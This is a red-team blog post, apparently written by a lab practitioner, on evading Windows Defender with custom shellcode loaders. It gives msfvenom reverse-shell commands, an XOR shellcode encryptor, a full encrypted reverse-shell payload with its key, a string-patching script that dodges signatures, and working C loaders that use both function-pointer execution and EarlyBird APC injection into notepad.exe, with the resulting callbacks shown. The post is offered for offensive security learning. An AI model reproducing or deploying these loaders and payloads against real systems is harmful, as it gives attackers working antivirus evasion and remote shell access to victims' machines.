Antivirus evasion has quickly become one of the most overwritten topics, with endless articles on writing shellcode loaders and other evasive stageless droppers. 

Many of these techniques, especially those from older sources, might not be effective right out of the box. This is largely due to the nature of malware development, where it is often a continuous cat-and-mouse game with vendors who are constantly pushing updates to their products.

## A Humble Beginning

For many malware developers, evading Windows Defender often represents the first hurdle or objective. While more experienced developers might view this as a relatively simple challenge, it certainly was not easy for me.

Earlier this year, I passed the [Certified Red Team Operator (CRTO)](https://training.zeropointsecurity.co.uk/courses/red-team-ops) and cleared HTB's [RastaLabs](https://app.hackthebox.com/prolabs/overview/rastalabs) both of which had an emphasis on defense evasion, and had Windows Defender enabled. (To be fair, both were not the latest version :P)

![rastalabs](https://i.gyazo.com/6ef28fc3532aecc0806b2a9accb38dd9.png)

Although I didn't have much trouble getting past Windows Defender, I did notice that it was _significantly_ harder than I had remembered, and a loader I made a couple months ago was getting signatured as soon as it was dropped to disk.

And other times, loaders with quite literally no evasion and default generated shellcode will walk right past Windows Defender.

![huh...?](https://i.gyazo.com/b81c0ac734090a09e61e80e6949e044d.png)

Windows Defender has always felt like a black box to me; payloads that functioned perfectly today would suddenly cease to work the next day, getting flagged for seemingly no reason.

Needless to say, without the necessary adjustments and refinement to public malware, your loaders are likely not going to get past defender.
## A Trip Down Memory Lane

[ired.team](https://www.ired.team/) was an amazing resource that guided me through my early days of cybersecurity, they have great resources that taught me a lot of what I know today. 

A classic blog post under "Defense Evasion" is the [AV Bypass with Metasploit Templates and Custom Binaries](https://www.ired.team/offensive-security/defense-evasion/av-bypass-with-metasploit-templates) post where they went through the stages of writing an evasive loader.

I _loved_ this post when I was starting out as seeing the VirusTotal detections slowly decrease with each step was so satisfying. 

However, I was sadly disappointed by the results when I followed through the same steps. Let's try out these techniques today, in 2024.

```bash
┌──(kali㉿kali)-[~/bruh]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=eth0 LPORT=443 -f exe > implant_x64.exe   
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
```

The original article got: 48/68 or **70.6%** detections.

![msf1](https://2603957456-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LN_AaNCmLBXOjQbjcTg%2F-LN_K0T7sNTDWSbmUIsm%2Fmsf-templates-default-payload.png?alt=media&token=db1f1a48-08a2-4919-ae2d-9c87fc815e92)

My results were: 58/72 or **80.6%** detections

![msf1](https://i.gyazo.com/07879cd9e2060a08b9bab50165a971bc.png)

It doesn't seem too large of a difference so far, let's move all the way to the techniques that evaded Windows Defender at the time.

### Windows Defender? I barely know 'er

The article used a custom shellcode loader that casted the start address of the shellcode to a function, and called the function to execute the shellcode.

```bash
┌──(kali㉿kali)-[~/bruh]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=eth0 LPORT=443 -f c                    
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of c file: 1963 bytes
unsigned char buf[] = 
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"

[... SNIP ...]

"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";
```


```c 
#include <windows.h>
unsigned char buf[] =
    "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
	[... SNIP ...]
    "\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";

int main() {
    void * exec = VirtualAlloc( 0, sizeof( buf ), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE );
    RtlMoveMemory( exec, buf, sizeof( buf ) );
    ( (void ( * )())exec )();
    return 0;
}
```

The article got a _staggering_ 3/68 or **4.4%** detections, this included Windows Defender, of course.

![msf2](https://2603957456-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LN_sILlRtO9ChAFtFwH%2F-LN_uK2_OHmB2U0S10J0%2Fmsf-vt4.png?alt=media&token=44c0be3c-f17a-4a8d-a18c-9b25bd6eb4a8)

My loader was not so fortunate with 32/71 or **45.0%** detections, which included Windows Defender.

![msf2](https://i.gyazo.com/07e7726345053880866f4c328a366141.png)

If you were paying attention to the Virus Total scans, you'd very quickly see this.

![date](https://i.gyazo.com/d0dbc1535bf0f7e75c541f647edb6316.png)

This article was posted and the scans were from around ~6 years ago (has it really been **SIX** years??). Since then, modern antivirus has gotten much _much_ better at detecting shellcode loaders. 

My guess is that AV back then was not very familiar with detecting malicious PIC, and simple shellcode loaders were sufficient.

### Back to the Present
Let's try to find out what Windows Defender is detecting in this loader.
![gocheck](https://i.gyazo.com/5c89bbcf0730489a1b485061a870bfe0.png)
Pop this into [Ghidra](https://github.com/NationalSecurityAgency/ghidra) and start disassembling our loader!

![ghidra1](https://i.gyazo.com/761c604ee241ae9c1c63287ff3f6a6e4.png)

We didn't strip the binary when compiling, so it's pretty easy for us to find the main function. Let's take reference from our loader and start renaming the variables.

![ghidra2](https://i.gyazo.com/c99049220356dd0a9bb76d357e30e0cf.png)

Since Windows Defender signatured us at an offset of **0x26CF**, we can jump to that address (0x0 + 0x26CF).

![0x26CF](https://i.gyazo.com/6beca358a87dfb0bbb6b4e38941d9d13.png)

This section of memory exists in the `.data` section and exists after the symbol `buf`.

![buf](https://i.gyazo.com/dd3230dbcf9bb2358ef8533a3eb22246.png)

If you remembered earlier, `buf` contains our msfvenom-generated shellcode. It seems like we're getting flagged on our shellcode when we drop to disk, let's work on extending their loader to be more evasive!

### Evading Static Analysis
Since our shellcode is being signatured, the next logical step is to include some encryption.

```bash
┌──(kali㉿kali)-[~/bruh]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=eth0 LPORT=443 -f raw > shellcode.bin
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
```

You can use whatever language you'd like to encrypt the shellcode, but I'm more comfortable with Python.

Do note that you'll also need to parse the shellcode file to output them into a char buffer in C.

```py
import argparse

def xor( data: bytes, key: bytes ) -> bytes:
    key_len = len( key )
    return bytes( [ data[ i ] ^ key[ i % key_len ] for i in range( len( data ) ) ] )

def shellcode_h( bin_file: str, name: str, key: bytes = None ) -> None:
    with open( bin_file, 'rb' ) as f:
        data = f.read()

    byte_arr = [ f"0x{byte:02x}" for byte in data ]
    shellcode = ', '.join( byte_arr )

    key_arr = [ f"0x{byte:02x}" for byte in key ]
    key = ', '.join( key_arr )

    with open( name, 'w' ) as f:
        {% raw %}
        f.write( f"unsigned char shellcode[] = {{ {shellcode} }};\n" )
        if key:
            f.write( f"unsigned char key[] = {{ {key} }};\n" )
        {% endraw %}

if __name__ == '__main__':
    parser = argparse.ArgumentParser( description='convert bin to c shellcode' )
    parser.add_argument( 'input', help='input file' )
    parser.add_argument( 'output', help='output file' )
    parser.add_argument( '-k', '--key', help='xor key' )
    args = parser.parse_args()

    bin_file = args.input
    c_file = args.output
    key = args.key

    if key:
        with open( bin_file, 'rb' ) as f:
            data = f.read()
        key = key.encode()
        data = xor( data, key )
        with open( bin_file + '.enc', 'wb' ) as f:
            f.write( data )
        bin_file = bin_file + '.enc'

    shellcode_h( bin_file, c_file, key )
```

This takes in raw shellcode, encrypts it and spits out 2 char arrays, one for `shellcode` and one for the XOR `key`.

```bash
./parser.py shellcode.bin out -k f67c2bcbfcfa30fccb36f72dca22a817
```

This generates an output file that can be directly included to a project as a header file (`#include "shellcode.h"`) or you can just copy paste them into your loader.

```c
unsigned char shellcode[] = { 0x9a, 0x7e, 0xb4, 0x87, 0xc2, 0x8a, 0xa3, 0x62, 0x66, 0x63, 0x27, 0x30, 0x72, 0x60, 0x34, 0x32, 0x35, 0x2a, 0x02, 0xe4, 0x03, 0x7f, 0xb9, 0x36, 0x03, 0x29, 0xb9, 0x60, 0x79, 0x70, 0xba, 0x65, 0x46, 0x7e, 0xbc, 0x11, 0x62, 0x2a, 0x6c, 0xd5, 0x2c, 0x29, 0x2b, 0x50, 0xfa, 0x78, 0x57, 0xa3, 0xcf, 0x5e, 0x52, 0x4a, 0x64, 0x1b, 0x12, 0x25, 0xa2, 0xa8, 0x3f, 0x73, 0x60, 0xf9, 0xd3, 0xda, 0x34, 0x77, 0x66, 0x2b, 0xb9, 0x30, 0x43, 0xe9, 0x24, 0x5f, 0x2e, 0x60, 0xe3, 0xbb, 0xe6, 0xeb, 0x63, 0x62, 0x33, 0x7e, 0xe3, 0xf7, 0x46, 0x03, 0x2b, 0x60, 0xe2, 0x62, 0xea, 0x70, 0x29, 0x73, 0xed, 0x76, 0x17, 0x2a, 0x33, 0xb2, 0x80, 0x34, 0x2e, 0x9c, 0xaf, 0x20, 0xb8, 0x04, 0xee, 0x2b, 0x62, 0xb4, 0x7e, 0x07, 0xaf, 0x7f, 0x03, 0xa4, 0xcf, 0x20, 0xf3, 0xfb, 0x6c, 0x79, 0x30, 0xf6, 0x5e, 0xd6, 0x42, 0x92, 0x7e, 0x61, 0x2f, 0x46, 0x6e, 0x26, 0x5f, 0xb0, 0x46, 0xe8, 0x3e, 0x27, 0xe8, 0x22, 0x17, 0x7f, 0x67, 0xe7, 0x54, 0x25, 0xe8, 0x6d, 0x7a, 0x76, 0xea, 0x78, 0x2d, 0x7e, 0x67, 0xe6, 0x76, 0xe8, 0x36, 0xea, 0x2b, 0x63, 0xb6, 0x22, 0x3e, 0x20, 0x6b, 0x6e, 0x3f, 0x39, 0x22, 0x3a, 0x72, 0x6f, 0x27, 0x6d, 0x7a, 0xe7, 0x8f, 0x41, 0x73, 0x60, 0x9e, 0xd8, 0x69, 0x76, 0x3f, 0x6c, 0x7f, 0xe8, 0x20, 0x8b, 0x34, 0x9d, 0x99, 0x9c, 0x3b, 0x28, 0x8d, 0x47, 0x15, 0x51, 0x3c, 0x51, 0x01, 0x36, 0x66, 0x76, 0x64, 0x2d, 0xea, 0x87, 0x7a, 0xb3, 0x8d, 0x98, 0x30, 0x37, 0x66, 0x7f, 0xbe, 0x86, 0x7b, 0xde, 0x61, 0x62, 0x67, 0xd8, 0xa6, 0xc9, 0xcd, 0x4f, 0x27, 0x37, 0x2a, 0xeb, 0xd7, 0x7a, 0xef, 0xc6, 0x73, 0xde, 0x2f, 0x16, 0x14, 0x35, 0x9e, 0xed, 0x7d, 0xbe, 0x8c, 0x5e, 0x36, 0x62, 0x32, 0x62, 0x3a, 0x23, 0xdc, 0x4a, 0xe6, 0x0a, 0x33, 0xcf, 0xb3, 0x33, 0x33, 0x2f, 0x02, 0xff, 0x2b, 0x06, 0xf2, 0x2c, 0x9c, 0xa1, 0x7a, 0xbb, 0xa3, 0x70, 0xce, 0xf7, 0x2e, 0xbf, 0xf6, 0x22, 0x88, 0x88, 0x6c, 0xbd, 0x86, 0x9c, 0xb3, 0x29, 0xba, 0xf7, 0x0c, 0x73, 0x22, 0x3a, 0x7f, 0xbf, 0x84, 0x7f, 0xbb, 0x9d, 0x22, 0xdb, 0xab, 0x97, 0x15, 0x59, 0xce, 0xe2, 0x2e, 0xb7, 0xf3, 0x23, 0x30, 0x62, 0x63, 0x2b, 0xde, 0x00, 0x0b, 0x05, 0x33, 0x30, 0x66, 0x63, 0x63, 0x23, 0x63, 0x77, 0x36, 0x7f, 0xbb, 0x86, 0x34, 0x36, 0x65, 0x7f, 0x50, 0xf8, 0x5b, 0x3a, 0x3f, 0x77, 0x67, 0x81, 0xce, 0x04, 0xa4, 0x26, 0x42, 0x37, 0x67, 0x60, 0x7b, 0xbd, 0x22, 0x47, 0x7b, 0xa4, 0x33, 0x5e, 0x2e, 0xbe, 0xd4, 0x32, 0x33, 0x20, 0x62, 0x73, 0x31, 0x79, 0x61, 0x7e, 0x99, 0xf6, 0x76, 0x33, 0x7b, 0x9d, 0xab, 0x2f, 0xef, 0xa2, 0x2a, 0xe8, 0xf2, 0x71, 0xdc, 0x1a, 0xaf, 0x5d, 0xb5, 0xc9, 0xb3, 0x7f, 0x03, 0xb6, 0x2b, 0x9e, 0xf8, 0xb9, 0x6f, 0x79, 0x8b, 0x3f, 0xe1, 0x2b, 0x57, 0x9c, 0xe7, 0xd9, 0x93, 0xd7, 0xc4, 0x35, 0x27, 0xdb, 0x95, 0xa5, 0xdb, 0xfe, 0x9c, 0xb7, 0x7b, 0xb5, 0xa2, 0x1f, 0x0e, 0x62, 0x1f, 0x6b, 0xb2, 0xc9, 0x81, 0x4d, 0x34, 0x8c, 0x21, 0x25, 0x45, 0x0c, 0x58, 0x62, 0x3a, 0x23, 0xef, 0xb9, 0x99, 0xb4 };

unsigned char key[] = { 0x66, 0x36, 0x37, 0x63, 0x32, 0x62, 0x63, 0x62, 0x66, 0x63, 0x66, 0x61, 0x33, 0x30, 0x66, 0x63, 0x63, 0x62, 0x33, 0x36, 0x66, 0x37, 0x32, 0x64, 0x63, 0x61, 0x32, 0x32, 0x61, 0x38, 0x31, 0x37 };
```

### Windows Defender? I barely know er' Part 2

So far, we've only added some basic encryption to the loader. It should look something like this:

```c
#include <windows.h>

unsigned char shellcode[] = {
    0x9a, 0x7e, 0xb4, 0x87, 0xc2, 0x8a, 0xa3,
    [...SNIP...]
    0x23, 0xef, 0xb9, 0x99, 0xb4 
};
 
unsigned char key[]       = {
    0x66, 0x36, 0x37, 0x63, 0x32, 0x62, 0x63,
    [...SNIP...],
    0x32, 0x32, 0x61, 0x38, 0x31 
};

void xor ( unsigned char * data, int data_len, unsigned char * key, int key_len ) {
    for ( int i = 0; i < data_len; i++ ) {
        data[i] = data[i] ^ key[i % key_len];
    }
}

int main() {

    void * exec = VirtualAlloc( 0, sizeof( shellcode ), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE );

    xor( shellcode, sizeof( shellcode ), key, sizeof( key ) );

    RtlMoveMemory( exec, shellcode, sizeof( shellcode ) );
    ( (void ( * )())exec )();

    return 0;
}
```

Now, let's compile the loader and check defender again!
### Rabbitholes

After running `gocheck`, I was surprised to see that the binary was flagged as malicious.
![huh](https://i.gyazo.com/26a0dff23c8cb9c90bd3d05dc4aa6e88.png)

According to `gocheck`, the string "msvcrt.dll" is being signatured as Meterpreter? That's strange. 

A google search doesn't help much, but string searching for "msvcrt.dll" in random discord channels lead me to [this article](https://whiteknightlabs.com/2023/05/23/unleashing-the-unseen-harnessing-the-power-of-cobalt-strike-profiles-for-edr-evasion/) by White Knight Labs on weaponizing Cobalt Strike with their artifact kit.

![msvcrt.dll](https://i.gyazo.com/3afeb0b9f4340268df90bc2526c853dd.png)

Seems like this is a known issue, the solution provided in the article was to make use of Cobalt Strike's Malleable C2 profile to `strrep` "msvcrt.dll" with an empty string. However, this wasn't very effective for them. But, since "msvcrt.dll" is our only false positive- let's try writing our own `strrep` script.

### Replacing Bad Strings

```python
import sys

def strrep( file_path, original_string, replacement_string ):
    ld = len( original_string ) - len( replacement_string )
    repl = replacement_string + '\x00' * ld

    try:
        with open( file_path, 'rb' ) as file:
            exe = file.read()

        modified_data = exe.replace( original_string.encode(), repl.encode() )

        with open( file_path, 'wb' ) as file:
            file.write( modified_data )

    except Exception as e:
        print( f"Error: {e}" )
        sys.exit( 1 )


if __name__ == "__main__":
    if len( sys.argv ) < 3:
        print( "Usage: python strrep.py <file_path> <original> <replacement>" )
        sys.exit( 1 )

    file_path = sys.argv[ 1 ]
    original = sys.argv[ 2 ]
    replacement = sys.argv[ 3 ]

    strrep( file_path, original, replacement )
```

We can now perform a string replace on our implant for `msvcrt.dll`
### Windows Defender? I barely know er' Part 3

```bash
./strrep.py ../bin/implant.exe msvcrt.dll \x00\x00\x00\x00
```

Let's run a `gocheck` on our binary again.

![gocheck2](https://i.gyazo.com/9dc13793619e124ea4a141a97cc7f111.png)

Awesome, let's drag this implant over to a Windows Defender enabled folder and get our callback!

![callback?](https://i.gyazo.com/7382008b8452f770d51589f9bdf649bf.png)

Yeap, knew it was too good to be true. A quick `ldd` on the binary shows that `msvcrt.dll` is dynamically linked.

```bash
PC@Zavier MINGW64 ~/Desktop/malware/exe/bin

$ ldd implant.exe 
        ntdll.dll => /c/Windows/SYSTEM32/ntdll.dll (0x7ff819610000)
        KERNEL32.DLL => /c/Windows/System32/KERNEL32.DLL (0x7ff8181a0000)    
        KERNELBASE.dll => /c/Windows/System32/KERNELBASE.dll (0x7ff816f60000)
        x00x00x00x00 => not found
```

### Denial

I went back to think about how the `msvcrt.dll` detection was being made, and it felt really strange. `msvcrt.dll` is a legitimate DLL by Microsoft that provides access to the MS Visual C Runtime Library, detection on an import of this library would lead to _many_ false positives.

At this point, I went searching for others who were encountering the same issue- and found this response by [@RastaMouse](https://twitter.com/_RastaMouse)

![rasta](https://i.gyazo.com/b0edf8d0f655ef341f10df0bacfddf3c.png)

So, I dragged the original binary over to a folder with Windows Defender enabled ran it, and- **i got my callback**

## Anger

At this point, I had spent countless hours trying to patch `msvcrt.dll` and trying to compile the loader with standard library linking disabled (`-no-stdlib`) and defining macros manually.

A budget solution seemed to work was to run a packer on the binary to completely obfuscate the strings, however, [UPX](https://upx.github.io/) was insufficient. [VMProtect](https://vmpsoft.com/) however worked just fine but produced a binary of >3 MB 😒

## Bargaining

I wanted to figure out why exactly this behavior was happening, as I was aware of false positives happening when running `gocheck` or any of the sort on binaries that were _already_ flagged. 

For example, if the binary was flagged due to some kind of malicious behavior, `MpCmdRun.exe` will flag it as malicious and either signature all the way to the last byte or throw it at the nearest DLL import.

However, in this case, I had Windows Defender Real-Time Protection disabled...

## Depression

Hmm, okay let's add our working directory as an exclusion despite real-time protection already being disabled.

![but](https://i.gyazo.com/ea8f279760e66789015499139c1359de.png)

... but, why?

## Acceptance

![okay](https://i.gyazo.com/1b990a2832195b1288ca28bdebda00a5.png)

## A New Direction

Despite being added to an exclusion, and `gocheck` returning no threats found on the binary. I decided to drag it over to the desktop, and run it.

Right after running it, I found this.

![process_start](https://i.gyazo.com/53ec6d3fd57c7893495b97dc886d8e41.png)

The reason this is happening is because the series of calls: 

1. Process Start
2. VirtualAlloc (PAGE_EXECUTE_READWRITE)
3. RtlMoveMemory (memmove)
4. Execution of Code in RWX Section
	1. Process Start
	2. Callback
	3. ...

is _very_ well known and even Windows Defender is able to pick up on common malicious patterns.

We'll have to change our loader into something, although also used extremely often, not _as_ abused as a casted function pointer.

### EarlyBird APC

The technique we'll use instead is a variation of APC injection that involves spawning a process in a suspended state, allocating memory & writing shellcode to private commit section, then queuing an APC routine to the shellcode- then the thread is resumed.

A more thorough and detailed explanation can be found: [here](https://0xmani.medium.com/early-bird-injection-05027fbfb794)

```c
#include <windows.h>
#include <stdio.h>

unsigned char shellcode[] = {
    0x9a, 0x7e, 0xb4, 0x87, 0xc2, 0x8a, 0xa3,
    [... SNIP ...]
    0x0c, 0x58, 0x62, 0x3a, 0x23, 0xef, 0xb9, 0x99, 0xb4 
};

unsigned char key[]       = {
    0x66, 0x36, 0x37, 0x63, 0x32, 0x62, 0x63, 
    [... SNIP ...],
    0x37 
};

void Xor( unsigned char * data, int data_len, unsigned char * key, int key_len ) {
    for ( int i = 0; i < data_len; i++ ) {
        data[i] = data[i] ^ key[i % key_len];
    }
}

int main() {

    STARTUPINFO         StartupInfo       = { 0 };
    PROCESS_INFORMATION ProcessInfo       = { 0 };
    LPCSTR              lpApplicationName = "C:\\Windows\\System32\\notepad.exe";
    LPVOID              lpAddress         = NULL;
    PDWORD              lpflOldProtect    = NULL;
    BOOL                StartupSuccess    = FALSE;
    BOOL                WriteSuccess      = FALSE;
    BOOL                ProtectSuccess    = FALSE;

    Xor( shellcode, sizeof( shellcode ), key, sizeof( key ) );

    if ( ! ( StartupSuccess = CreateProcessA( lpApplicationName, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &StartupInfo, &ProcessInfo ) ) ) {
        printf( "CreateProcess failed (%d).\n", GetLastError() );
        return 1;
    }

    if ( ! ( lpAddress = VirtualAllocEx( ProcessInfo.hProcess, NULL, sizeof( shellcode ), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE ) ) ) {
        printf( "VirtualAllocEx failed (%d).\n", GetLastError() );
        return 1;
    }

    if ( ! ( WriteSuccess = WriteProcessMemory( ProcessInfo.hProcess, lpAddress, shellcode, sizeof( shellcode ), NULL ) ) ) {
        printf( "WriteProcessMemory failed (%d).\n", GetLastError() );
        return 1;
    }

    if ( ! ( ProtectSuccess = VirtualProtectEx( ProcessInfo.hProcess, lpAddress, sizeof( shellcode ), PAGE_EXECUTE_READ, &lpflOldProtect ) ) ) {
        printf( "VirtualProtectEx failed (%d).\n", GetLastError() );
        return 1;
    }

    if ( ! ( StartupSuccess = QueueUserAPC( (PAPCFUNC)lpAddress, ProcessInfo.hThread, NULL ) ) ) {
        printf( "QueueUserAPC failed (%d).\n", GetLastError() );
        return 1;
    }

    ResumeThread( ProcessInfo.hThread );

    return 0;
}

```

Immediately, `gocheck` says that Windows Defender thinks the file is clean!

![new_impl](https://i.gyazo.com/b5b1cc4cc30515821e81af848fe16ff9.png)

And, executing the loader in a Windows Defender enabled folder gives us our callback successfully! :)

![callback](https://i.gyazo.com/52210081f416537f2a42d49241453dd5.png)

Our RX section containing our shellcode can be found here.

For shits and giggles, let's check the detections on VirusTotal

![vt](https://i.gyazo.com/903be9cf2631f6d19a74e1598b2de03c.png)

20/72, or **27.8%** detections. Not bad, not bad at all, but not as good as ired.team's 4.4% detection rate from 2018 xD

## Advice on Evasion

I have been getting more into the operational side of red teaming recently, especially after doing RastaLabs and CRTO. Although writing shellcode loaders is fun, it can be _quite_ annoying when you have to make loads of them on the fly for different payloads.

Windows Defender evasion can be a serious pain in the ass if you haven't written an evasive loader in a bit, especially when it comes to reusing loaders and re-encrypting shellcode.

> Have you ever had to encrypt and copy paste `sliver` shellcode? (BTW, `sliver` shellcode can be up to 10 MB large)

This process can be irritating for a lazy person such as myself who doesn't want to set up stagers to catch shellcode, although in real engagements- I don't know a single person who doesn't endorse stagers.

### Automation

Earlier, we wrote a script that encrypts shellcode and spits them out into output files that can be directly included into projects as headers. 

This was just one of the many small little scripts I've written to make my life just a little bit easier when writing stageless loaders, although I do stage my payloads when it's more convenient.

I collated all my little scripts and ideas together to make a tool called [ldrgen](https://github.com/gatariee/ldrgen) that I frequently use to make templated loaders that I can reuse over and over again.

A separate blog post will probably be made about this tool, but just throwing it out there incase anyone finds it useful :)

For those curious, I used [this profile](https://github.com/gatariee/ldrgen/blob/main/profiles/ebapc.json) for all my labs that involve Windows Defender and I have never noticed it when dropping to disk.

### Takeaways

Evasion is _not as easy_ as it was 6 years ago, but it _is_ relatively easy to evade Windows Defender. 

My experience with Windows Defender is that getting through it initially is not too difficult, the difficulty comes with doing post-exploitation activities with Defender constantly watching.

Windows Defender enjoys scanning executable sections of memory; during a **memory scan**, if your shellcode is unencrypted in memory- it will likely get caught and killed. If you're interested in post-exploitation beacon activities, you can look into general sleep mask techniques such as: [Ekko](https://github.com/Cracked5pider/Ekko), [Shellcode Fluctuation](https://github.com/mgeeky/ShellcodeFluctuation), [Foliage](https://github.com/realoriginal/foliage) and this amazing talk by [Kyle Avery](https://twitter.com/kyleavery_) on [Avoiding Memory Scanners](https://www.youtube.com/watch?v=edIMUcxCueA)

That being said, I think that evading Windows Defender is not a feat that should be down-played and it's certainly a step in the right direction for all aspiring developers.
